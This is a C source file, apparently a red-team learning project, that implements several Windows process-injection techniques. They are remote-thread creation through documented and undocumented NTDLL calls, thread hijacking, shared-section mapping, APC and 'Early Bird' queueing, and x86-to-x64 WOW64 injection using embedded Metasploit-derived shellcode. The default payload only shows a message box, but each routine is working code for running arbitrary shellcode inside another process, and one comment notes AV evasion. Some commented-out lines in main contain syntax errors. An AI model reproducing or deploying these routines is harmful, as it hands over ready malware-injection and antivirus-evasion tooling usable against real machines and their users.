/* 
 This file contains a collection of basic injection methods. As you go down the list of functions each function abuses a different
 part of the Windows API to inject and execute the shellcode. I will add more sophisticated methos as I learn them.
*/


#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>

//shellcode for a simple message box (x64)
unsigned char shellcode[] = {
  0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x00, 0x00,
  0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65,
  0x48, 0x8b, 0x52, 0x60, 0x3e, 0x48, 0x8b, 0x52, 0x18, 0x3e, 0x48, 0x8b,
  0x52, 0x20, 0x3e, 0x48, 0x8b, 0x72, 0x50, 0x3e, 0x48, 0x0f, 0xb7, 0x4a,
  0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02,
  0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52,
  0x41, 0x51, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x8b, 0x42, 0x3c, 0x48,
  0x01, 0xd0, 0x3e, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0,
  0x74, 0x6f, 0x48, 0x01, 0xd0, 0x50, 0x3e, 0x8b, 0x48, 0x18, 0x3e, 0x44,
  0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x5c, 0x48, 0xff, 0xc9, 0x3e,
  0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31,
  0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75,
  0xf1, 0x3e, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd6,
  0x58, 0x3e, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x3e, 0x41,
  0x8b, 0x0c, 0x48, 0x3e, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x3e,
  0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e,
  0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20,
  0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x3e, 0x48, 0x8b, 0x12,
  0xe9, 0x49, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xc7, 0xc1, 0x00, 0x00, 0x00,
  0x00, 0x3e, 0x48, 0x8d, 0x95, 0x1a, 0x01, 0x00, 0x00, 0x3e, 0x4c, 0x8d,
  0x85, 0x35, 0x01, 0x00, 0x00, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x45, 0x83,
  0x56, 0x07, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6,
  0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c,
  0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,
  0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x48, 0x69, 0x20, 0x66, 0x72,
  0x6f, 0x6d, 0x20, 0x52, 0x65, 0x64, 0x20, 0x54, 0x65, 0x61, 0x6d, 0x20,
  0x4f, 0x70, 0x65, 0x72, 0x61, 0x74, 0x6f, 0x72, 0x21, 0x00, 0x52, 0x54,
  0x4f, 0x3a, 0x20, 0x4d, 0x61, 0x6c, 0x44, 0x65, 0x76, 0x00
};
unsigned int shellcode_len = sizeof(shellcode);

//required for cross injection (x32 host process -> x64 victim process)
//simple struct for RtlCreateThread parameters
typedef struct _WOW64CONTEXT
{
  union
  {
    HANDLE hProcess;
    BYTE bPadding2[8];
  } h;
  union
  {
    LPVOID lpStartAddress;
    BYTE bPadding1[8]; 
  } s;
  union
  {
    LPVOID lpParameter;
    BYTE bPadding2[8];
  } p;
  union
  {
    HANDLE hThread;
    BYTE bPadding2[8];
  } t;
} WOW64CONTEXT, * LPWOW64CONTEXT;
//The native x64 function you specify must be in the following form (as well as being x64 code):
typedef BOOL (WINAPI * X64FUNCTION)( DWORD dwParameter );
//Can be called from C using the following prototype: (more explained in the InjectWOW64 function)
typedef DWORD (WINAPI * EXECUTEX64)( X64FUNCTION pFunction, DWORD dwParameter );


//required for ntdll structures/functions
typedef enum _SECTION_INHERIT {
    ViewShare=1,
    ViewUnmap=2
} SECTION_INHERIT, *PSECTION_INHERIT;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES;
typedef OBJECT_ATTRIBUTES *POBJECT_ATTRIBUTES;

typedef NTSTATUS (NTAPI * RtlCreateUserThread_T) (
	HANDLE ProcessHandle,
	PSECURITY_DESCRIPTOR SecurityDescriptor,
	BOOLEAN CreateSuspended,
	ULONG StackZeroBits,
	OUT PULONG StackReserved,
	OUT PULONG StackCommit,
	PVOID StartAddress,
	PVOID StartParameter,
	PHANDLE ThreadHandle,
	PCLIENT_ID ClientID 
);
  
typedef NTSTATUS (NTAPI * NtCreateThreadEx_T) (
	PHANDLE ThreadHandle,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	HANDLE ProcessHandle,
	PVOID StartRoutine,
	PVOID Argument,
	ULONG CreateFlags,
	ULONG_PTR ZeroBits,
	SIZE_T StackSize,
	SIZE_T MaximumStackSize,
	PVOID AttributeList
);

typedef NTSTATUS (NTAPI * NtCreateSection_T) (
	PHANDLE SectionHandle,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PLARGE_INTEGER MaximumSize,
	ULONG SectionPageProtection,
	ULONG AllocationAttributes,
	HANDLE FileHandle
);

typedef NTSTATUS (NTAPI * NtMapViewOfSection_T) (
	HANDLE SectionHandle,
	HANDLE ProcessHandle,
	PVOID *BaseAddress,
	ULONG_PTR ZeroBits,
	SIZE_T CommitSize,
	PLARGE_INTEGER SectionOffset,
	PSIZE_T ViewSize,
	SECTION_INHERIT InheritDisposition,
	ULONG AllocationType,
	ULONG Win32Protect
);

//finds process ID using Tool Help Library
int FindProcess(char * pName){
	HANDLE hProcessSnap;
	HANDLE hProcess;
	PROCESSENTRY32 pe32;
	
	hProcessSnap = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
	if( hProcessSnap == INVALID_HANDLE_VALUE)
		return NULL;

	pe32.dwSize = sizeof( PROCESSENTRY32 );

	if( !Process32First( hProcessSnap, &pe32 )){
		CloseHandle(hProcessSnap);
		return NULL;
	}
	
	do {
				
		if(strcmpi(pName, pe32.szExeFile) == 0) return pe32.th32ProcessID;
		
	} while (Process32Next(hProcessSnap,&pe32));
		pe32.th32ProcessID;
		
	
	return 0;
}

//finds a thread ID
int FindThread(int PID) {
	
	HANDLE hThreadSnap = INVALID_HANDLE_VALUE; 
	THREADENTRY32 te32; 
	
	hThreadSnap = CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, 0 ); 
		if( hThreadSnap == INVALID_HANDLE_VALUE ) return 1; 
	
	te32.dwSize = sizeof(THREADENTRY32 ); 
 
	if( !Thread32First( hThreadSnap, &te32 ) ) return 1;

	do { 

    if( te32.th32OwnerProcessID == PID ) return te32.th32ThreadID;
	
  } while( Thread32Next(hThreadSnap, &te32 ) );
	
	return -1;
	
}

/*
 ---Arguments---
 hProcess: Handle of victim process
 Shellcode: Memory address of shellcode
 Shellcode_len: Length of shellcode
 Method: Thread Execution Function.. 1 uses CreateRemoteThread, 2 uses RtlCreateUserThread, 3 uses NtCreateThreadEx
 ---------------
 
 This function injects into a process by: Allocating space -> Copying shellcode -> Start a thread pointing at the shellcode
*/
int InjectClassic(HANDLE hProcess, char * shellcode, int shellcode_len, int method){
	
	//init ntdll variables and functions
	CLIENT_ID cid;
	RtlCreateUserThread_T pRtlCreateUserThread = (RtlCreateUserThread_T) GetProcAddress(GetModuleHandle("NTDLL.DLL"),"RtlCreateUserThread");
	NtCreateThreadEx_T pNtCreateThreadEx = (NtCreateThreadEx_T) GetProcAddress(GetModuleHandle("NTDLL.DLL"),"NtCreateThreadEx");
	
	HANDLE hThread;
	
	LPVOID rem_exec;
	PDWORD oldProtect;
	
	//allocate, copy, then change protections 
	rem_exec = VirtualAllocEx(hProcess, 0, (DWORD) shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(hProcess, rem_exec, shellcode, shellcode_len, 0);
	if (!VirtualProtectEx(hProcess, rem_exec, shellcode_len, PAGE_EXECUTE_READ, (PDWORD) &oldProtect)) return 1;
	
	//first method is the windows documented CreateRemoteThread
	//other two methods are NTDLL undocumented functions, probably less likely to be caught by an AV (although still very likely)
	switch(method){
		case 1:
			hThread = CreateRemoteThread(hProcess, 0,0, (LPTHREAD_START_ROUTINE) rem_exec,0,0,0);
			break;
		case 2:
			pRtlCreateUserThread(hProcess, 0, FALSE, 0, 0, 0, rem_exec, 0, &hThread, &cid);
			break;
		case 3:
			pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, 0, hProcess, (LPTHREAD_START_ROUTINE) rem_exec, 0, 0, 0, 0, 0 , 0);
			break;
	}
	
	if (!hThread) return 1;
	
	WaitForSingleObject(hThread, 500);
	return 0;

}
/*
 ---Arguments---
 hProcess: Handle of victim process
 PID: PID of victim process
 Shellcode: Memory address of shellcode
 Shellcode_len: Length of shellcode
 ---------------
 
 This function allocates and copies the shellcode into the target process just as in classic injection, but 
 instead of creating a new thread it hijacks an existing threads and changes its instruction pointer to the
 newly allocated memory. This injection method likely crashes the process as the thread does not return back to 
 its normal execution.
*/
int InjectThreadContext(HANDLE hProcess, int PID, char * shellcode, int shellcode_len){

	LPVOID rem_exec;
	PDWORD oldProtect;
	
	int TID;
	HANDLE hThread;
	
	CONTEXT cx;
	
	//allocate, copy, then change protections 
	rem_exec = VirtualAllocEx(hProcess, 0, (DWORD) shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(hProcess, rem_exec, shellcode, shellcode_len, 0);
	if (!VirtualProtectEx(hProcess, rem_exec, shellcode_len, PAGE_EXECUTE_READ, (PDWORD) &oldProtect)) return 1;
	
	//find a thread to inject
	TID = FindThread(PID);
	if (TID == -1) return 1;
	
	hThread = OpenThread( THREAD_ALL_ACCESS, 0, TID);
	if (!hThread) return 1;
	
	//
	if (SuspendThread(hThread) == -1) return 1;
	cx.ContextFlags = CONTEXT_FULL;
	if (!GetThreadContext( hThread, &cx)) return 1;
		
	#ifdef _M_IX86 
		cx.Eip = (DWORD_PTR) rem_exec;
	#else
		cx.Rip = (DWORD_PTR) rem_exec;
	#endif
	
	if (!SetThreadContext( hThread, &cx)) return 1;
	if (ResumeThread(hThread) == -1) return 1;
	
	return 0;
}

/*
 ---Arguments---
 hProcess: Handle of victim process
 Shellcode: Memory address of shellcode
 Shellcode_len: Length of shellcode
 ---------------
 
 This function creates a section which represents an area in memory which can be shared between processes. 
 Data in sections can only be read, written, or executed by processes (local or remote) with an object 
 called a view, which corresponds to the visible part of the section to that specific process. The shellcode
 is first written to the section using a local view by the local process, and then is executed by the remote
 process using a remote view. 
 */
int InjectSection (HANDLE hProcess, unsigned char * shellcode, unsigned int shellcode_len) {
	
	HANDLE sHandle = NULL;
	HANDLE hThread = NULL;
	PVOID viewAddress = NULL;
	PVOID remoteViewAddress = NULL;
	
	//create a section in the injecting process
	NtCreateSection_T pNtCreateSection = (NtCreateSection_T) GetProcAddress(GetModuleHandle("NTDLL.DLL"),"NtCreateSection");
	if (pNtCreateSection( &sHandle, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER) &shellcode_len, PAGE_EXECUTE_READWRITE, SEC_COMMIT, 0)) return 1;
	
	//create a view in the injecting process
	NtMapViewOfSection_T pNtMapViewOfSection = (NtMapViewOfSection_T) GetProcAddress(GetModuleHandle("NTDLL.dll"), "NtMapViewOfSection");
	if (pNtMapViewOfSection( sHandle, GetCurrentProcess(), &viewAddress, NULL, NULL, NULL, (PSIZE_T) &shellcode_len, ViewUnmap, NULL, PAGE_READWRITE)) return 1;
	
	//copy the shellcode from .data(global var) to the view of the section
	memcpy(viewAddress, shellcode, shellcode_len);
	
	//create a remote view with execute rights pointing to the local section
	if (pNtMapViewOfSection( sHandle, hProcess, &remoteViewAddress, NULL, NULL, NULL, (PSIZE_T) &shellcode_len, ViewUnmap, NULL, PAGE_EXECUTE_READ)) return 1; 
	
	//create a new thread starting at the address of the view
	hThread = CreateRemoteThread(hProcess, 0,0, (LPTHREAD_START_ROUTINE) remoteViewAddress, 0,0,0);
	if (!hThread) return 1;

	WaitForSingleObject(hThread, 500);
	
	return 0;
}

/*
 ---Arguments---
 hProcess: Handle of victim process
 PID: PID of victim process
 Shellcode: Memory address of shellcode
 Shellcode_len: Length of shellcode
 ---------------
 
 This function is quite simple. Windows supplies programs with the ability to queue functions for future use,
 this function is called an APC (Asynchronous Procedure Call). These functions are queued and executed within the context
 of a singular thread, this means the operating system needs to keep an APC queue for each thread. Once an APC function is queued, 
 it cannot be called unless the thread goes into an "alertable" state, as defined by the Windows operating system. This state
 can be achieved by a few Windows API functions such as SleepEx and SignalObjectAndWait, it can also be achieved by
 low level NT API calls that are not revealed by Windows.
 
 APC injection is useful because even though there is allocation and writing of memory, all execution calls to the thread actually come from the 
 system itself. Unlike all the methods above, we do not directly create or modify threads, instead modifying the APC queue.
 
 APC injection has two big issues:
 - Succesful execution of the APC queued function can likely crash the parent process, as the process has no way to recover where 
 it was previously. (At least in this implementation, i'm still a noob :) )
 - The injecting process has no way of forcing the victim thread to go into an alertable state without running one of the methods above,
 but if we do so it makes the whole approach useless as we are once again creating or modifiying a thread. The injected APC function is only
 executed when a user or the program somehow calls one the functions that cause an alertable state.
*/
int InjectAPC( HANDLE hProcess, int PID, unsigned char * shellcode, unsigned int shellcode_len) {
	
	//find and open a thread in a target process
	HANDLE hThread = NULL;
	int TID;
	LPVOID rem_exec;
	
	TID = FindThread(PID);
	if (TID == -1)
		return 1;
	
	hThread = OpenThread( THREAD_ALL_ACCESS, 0, TID);
		
	//inject the code into the process memory
	rem_exec = VirtualAllocEx(hProcess, 0, (DWORD) shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(hProcess, rem_exec, shellcode, shellcode_len, 0);
	
	//insert the function into the APC queue of target thread
	if (!QueueUserAPC( (PAPCFUNC) rem_exec, hThread, NULL))
		return 1;
	
	return 0;
	
}

/*
 ---Arguments---
 hProcess: Name of victim process
 Shellcode: Memory address of shellcode
 Shellcode_len: Length of shellcode
 ---------------
 
 This function uses identical methodology to the InjectAPC function. It abuses the APC queue to execute
 a malicious function injected into a remote process. Unlike InjectAPC however, it uses a technique called
 "Early Bird" to force the remote thread into an alertable state without actually interacting with it. Also
 unlike InjectAPC, it does not inject into an already existing process but instead creates a new process
 and exploits it. 
 
 How it works is quite interesting, at a high level it appears that each time a process is created,
 the APC queue is checked for its initial thread. My guess is that this is for programs that would like
 to utilize the APC queue to initialize some functions to run as soon as a process is executed.
 As a result an APC request which is placed before a process is created will lead to the that function 
 being immediatly executed on process start.
 
 Implementation wise it is quite simple, a process must be started in a suspended mode before 
 the malicious function is added to the APC queue, the process is then resumed to start execution. 
 The first user code at the entrypoint will be the malicious function.
*/
int InjectEarlyBird( char * processName , unsigned char * shellcode, unsigned int shellcode_len) {
	
	LPVOID rem_exec;

	
	STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );

    // Start the child process. 
    if( !CreateProcess( NULL,   // No module name (use command line)
        "notepad.exe",        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        CREATE_SUSPENDED,   // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi )           // Pointer to PROCESS_INFORMATION structure
    ) return 1;
	
    // Allocate and copy shellcode	
	rem_exec = VirtualAllocEx( pi.hProcess, 0, (DWORD) shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory( pi.hProcess, rem_exec, shellcode, shellcode_len, 0);
	
	// Queue APC then resume the thread
	QueueUserAPC( (PAPCFUNC) rem_exec, pi.hThread, NULL);	
	
	ResumeThread( pi.hThread);

    // Close process and thread handles. 
    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );

	return 0;
}

/*
 ---Arguments---
 hProcess: Handle of victim process
 Shellcode: Memory address of shellcode
 Shellcode_len: Length of shellcode
 ---------------
 
 This function is for a very specific case of injection, x32 host process injecting into a x64
 victim process. This is not possible only by using Windows API functions. This is because 
 execution methods such as the one described above are not forward compatibile. Without going into too
 much detail, some functions used by the x32 ntdll have slightly different implementations
 than the ones used in the x64 ntdll. This means that a x32 version of a function such as 
 CreateRemoteThread will not be able to create a thread in an x64 process.              

 There are three general steps required to inject into a x64 process from a x32 process:
 #1 Switch into x64 mode 
 #2 Locate and execute the required x64 function  
 #3 Return to x32 mode
 
 Once again the implementation is quite simple, and fortunately, researchers at metasploit have created 
 functions that do exactly what is described above. 

 Function 1 (X64FUNCTION) : https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/migrate/remotethread.asm
	(Step 2) This function searches through the loaded modules of the current process in order to extract
	the base address of the x64 ntdll.dll. It then searches through ntdll's export table to find and extract 
	RtlCreateUserThread's address. Please go through the code to get a better understanding of the implementation, 
	it contains excellent documentation.

 Function 2 (EXECUTE64): https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/migrate/executex64.asm
	(Step 1 and 3) This function switches the CPU context to x64, then jumps to the function address found above, then returns
	to x32 mode. Once again please go through the code to get a better understanding of the implementation.

 Utilizing these two functions makes the injection very straightforward.  
*/
int InjectWOW64( HANDLE hProc, unsigned char shellcode[], unsigned int shellcode_len){
	
	// code to perform the two functions discussed above, compilation details are in the github link.
	unsigned char execute64_payload[] = { 0x55, 0x89, 0xe5, 0x56, 0x57, 0x8b, 0x75, 0x8, 0x8b, 0x4d, 0xc, 0xe8, 0x0, 0x0, 0x0, 0x0, 0x58, 0x83, 0xc0, 0x2a, 0x83, 0xec, 0x8, 0x89, 0xe2, 0xc7, 0x42, 0x4, 0x33, 0x0, 0x0, 0x0, 0x89, 0x2, 0xe8, 0xe, 0x0, 0x0, 0x0, 0x66, 0x8c, 0xd8, 0x8e, 0xd0, 0x83, 0xc4, 0x14, 0x5f, 0x5e, 0x5d, 0xc2, 0x8, 0x0, 0x8b, 0x3c, 0x24, 0xff, 0x2a, 0x48, 0x31, 0xc0, 0x57, 0xff, 0xd6, 0x5f, 0x50, 0xc7, 0x44, 0x24, 0x4, 0x23, 0x0, 0x0, 0x0, 0x89, 0x3c, 0x24, 0xff, 0x2c, 0x24 };
	unsigned int execute64_len = sizeof(execute64_payload);

	unsigned char function64_payload[] = { 0xfc, 0x48, 0x89, 0xce, 0x48, 0x89, 0xe7, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc8, 0x0, 0x0, 0x0, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0xf, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x2, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0xd, 0x41, 0x1, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x1, 0xd0, 0x66, 0x81, 0x78, 0x18, 0xb, 0x2, 0x75, 0x72, 0x8b, 0x80, 0x88, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x1, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x1, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x1, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0xd, 0x41, 0x1, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x3, 0x4c, 0x24, 0x8, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x1, 0xd0, 0x66, 0x41, 0x8b, 0xc, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x1, 0xd0, 0x41, 0x8b, 0x4, 0x88, 0x48, 0x1, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x4f, 0xff, 0xff, 0xff, 0x5d, 0x4d, 0x31, 0xc9, 0x41, 0x51, 0x48, 0x8d, 0x46, 0x18, 0x50, 0xff, 0x76, 0x10, 0xff, 0x76, 0x8, 0x41, 0x51, 0x41, 0x51, 0x41, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x48, 0x31, 0xd2, 0x48, 0x8b, 0xe, 0x41, 0xba, 0xc8, 0x38, 0xa4, 0x40, 0xff, 0xd5, 0x48, 0x85, 0xc0, 0x74, 0x7, 0xb8, 0x0, 0x0, 0x0, 0x0, 0xeb, 0x5, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x50, 0x48, 0x89, 0xfc, 0xc3 };
	unsigned int function64_len = sizeof(function64_payload);
	
	// ctx variable will be used to hold the paramaters of RtlCreateThread
	WOW64CONTEXT * ctx;
	
	// these two work perfectly, even when injecting x64 -> x32, so we don't need any WOW64 tricks
	LPVOID payload_mem = VirtualAllocEx( hProc, 0, shellcode_len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);	
	WriteProcessMemory( hProc, payload_mem, shellcode, shellcode_len, 0);
	
	// allocate for and write the code of execute64 and function64 into our process' memory
	// also create some space for the function parameters
	X64FUNCTION pFunc64 = (X64FUNCTION) VirtualAlloc( 0, function64_len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);	
	EXECUTEX64 pExec64 = (EXECUTEX64) VirtualAlloc( 0, execute64_len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);	
	LPVOID ctx_mem = VirtualAlloc( 0, sizeof(WOW64CONTEXT), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);	
	
	memcpy( pFunc64, function64_payload, function64_len);
	memcpy( pExec64, execute64_payload, execute64_len);
		
	// initialize ctx structure
	ctx = (WOW64CONTEXT *) ctx_mem; 

	ctx->h.hProcess = hProc;
	ctx->s.lpStartAddress = payload_mem;
	ctx->p.lpParameter = 0;
	ctx->t.hThread = NULL;

	// execute the two functions as described in the github link above
	pExec64( pFunc64, (DWORD)ctx);
	
	if( ctx->t.hThread ) {
		ResumeThread(ctx->t.hThread);
		return 0;
	} else {
		return 1;
	}
	
}




int main(){

	//example
	char * processName = "notepad.exe";
	int PID = FindProcess(processName);
	HANDLE hProcess =  OpenProcess(PROCESS_ALL_ACCESS, 0, (DWORD) PID);
	
	printf("%d\n", PID);
	/*
	if (!hProcess)
		return 1;
	
	if (InjectClassic(hProcess, shellcode, shellcode_len, 3))
		return 1;
	
	
	if (InjectThreadContext(hProcess, PID, shellcode, shellcode_len))
		return 1;r
	
	if (InjectSection(hProcess, shellcode, shellcode_len))
		return 1;
	
	if (InjectAPC(hProcess, PID, shellcode, shellcode_len))
		return 1;
	
	if InjectEarlyBird( processName, shellcode, shellcode_len);
		return 1;

	
	if (InjectWOW64( hProcess, shellcode, shellcode_len))
		return 1;
	
	*/

	return 0;

}
